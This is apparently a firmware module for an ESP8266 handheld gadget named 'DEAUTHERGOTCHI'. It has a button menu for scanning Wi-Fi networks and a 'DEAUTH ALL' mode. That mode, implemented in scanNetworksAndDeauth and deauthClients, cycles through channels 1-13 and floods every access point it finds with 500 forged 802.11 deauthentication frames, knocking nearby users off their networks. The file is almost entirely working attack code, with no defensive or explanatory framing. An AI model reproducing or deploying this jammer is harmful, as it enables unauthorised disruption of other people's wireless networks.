extern "C" {
  #include "user_interface.h"
}

String deauth_command[] = {"< SCAN >", "< DEAUTH ALL>", "< STOP >"  };

int deauth_selectedMode = 0;
int deauth_commandLength = 3;
Button2 deauth_ButtonLeft;
Button2 deauth_ButtonRight;
Button2 deauth_ButtonA;
Button2 deauth_ButtonB;
bool once = false;
bool deauth_showmenu = true;

void deauthergotchi_setup()
{
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  displayClearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 5);
  display.println("DEAUTHERGOTCHI");
  display.println("");
  display.display();

  
  deauth_ButtonLeft.begin(BTN_LEFT);
  deauth_ButtonRight.begin(BTN_RIGHT);
  deauth_ButtonA.begin(BTN_A);
  deauth_ButtonB.begin(BTN_B);
  deauth_ButtonLeft.setPressedHandler(deauth_LeftButtonPressed);
  deauth_ButtonRight.setPressedHandler(deauth_RightButtonPressed);
  deauth_ButtonA.setPressedHandler(deauth_AButtonPressed);
  deauth_ButtonB.setPressedHandler(deauth_BButtonPressed);
}

void deauthergotchi_loop()
{
    
    if( deauth_showmenu)
   {
    display.clearDisplay();
    display.setCursor(0, 5);
    display.println("DEAUTHERGOTCHI (v_v)");
    display.println(" ");
    display.println(deauth_command[deauth_selectedMode]);
   }
    if( deauth_selectedMode ==0 && once)
   {
    scanAndDisplayNetworks();
    once=false;
    deauth_showmenu=false;
   }
   if( deauth_selectedMode ==1 && once)
   {
    scanNetworksAndDeauth();
    once=false;
    deauth_showmenu=false;
   }

  display.display();

  deauth_ButtonLeft.loop();
  deauth_ButtonRight.loop();
  deauth_ButtonA.loop();
  deauth_ButtonB.loop();
}


void deauth_LeftButtonPressed(Button2 &btn) {
   deauth_selectedMode--;
    if(deauth_selectedMode< 0 )deauth_selectedMode=deauth_commandLength-1;
}

void deauth_RightButtonPressed(Button2 &btn) {
 deauth_selectedMode++;
    if(deauth_selectedMode>=deauth_commandLength)deauth_selectedMode=0;
}

void deauth_AButtonPressed(Button2 &btn) {
  //playTone();
  once = true;
  deauth_showmenu=false;
}
void deauth_BButtonPressed(Button2 &btn) {
  //playTone();
  deauth_showmenu=true;
}

void scanAndDisplayNetworks() {
  int n = WiFi.scanNetworks();
  
  display.clearDisplay();
  
  if (n == 0) {
    display.setCursor(0,0);
    display.println("No networks found");
    Serial.println("No networks found");
    display.display();
    return;
  }

  int linesPerScreen = SCREEN_HEIGHT / 10; // Calculate how many lines fit on the screen
  for (int start = 0; start < n; start += linesPerScreen) {
    display.clearDisplay();
    
    for (int i = start; i < start + linesPerScreen && i < n; ++i) {
      display.setCursor(0, (i - start) * 10);
      display.print(i + 1);
      display.print(": ");
      display.print(WiFi.SSID(i));
      
    }
    
    display.display();
    delay(1000); // Pause to allow reading of the current screen
  }
  
  display.display();

}

void scanNetworksAndDeauth() {
  for (int channel = 1; channel <= 13; channel++) {
    wifi_set_channel(channel);
    int n = WiFi.scanNetworks();
    display.clearDisplay();
    display.setCursor(0,10);

    display.println("Channel :"+String(channel)+" H:"+ String(n) );
    display.display();

    for (int i = 0; i < n; ++i) {
      display.setCursor(0,20);
      display.println("attack running:");
      deauthClients(WiFi.BSSID(i));
      delay(100);
      display.display();
    }
    display.display();
    delay(1000);
    display.println("complete!");
    delay(1000);
    display.display();
  }
}

void deauthClients(uint8_t *bssid) {
  uint8_t packet[26] = {
    0xC0, 0x00,             // Frame Control: Deauthentication
    0x3A, 0x01,             // Duration
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Destination MAC (BSSID)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Source MAC (BSSID)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID
    0x00, 0x00              // Sequence Number
  };

  for (int i = 0; i < 500; i++) { // Send multiple packets to ensure disconnection
    wifi_send_pkt_freedom(packet, sizeof(packet), false);
    delay(10);
  }
}